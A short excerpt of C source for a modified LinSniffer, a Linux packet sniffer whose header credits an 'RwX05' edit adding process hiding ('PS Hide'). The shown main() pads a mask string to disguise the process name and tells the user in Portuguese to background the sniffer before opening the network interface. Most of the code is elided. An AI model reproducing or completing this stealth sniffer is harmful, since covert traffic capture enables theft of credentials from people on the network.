/*
LinSniffer originally by Mike Edulla <medulla@infosoc.com>
Edited By KByte to RwX05.
Improved Selection of Device and LOG name.
Added PS Hide by KByte */
...
main(int argc, char **argv)
{
   ...
   strcat(MASCARA, "          ");
   system("clear");
   printf("Tudo pronto.Ctrl +z Agora e digite bg para continuar rodando o sniffer");
   s=openintf(nomedevice);
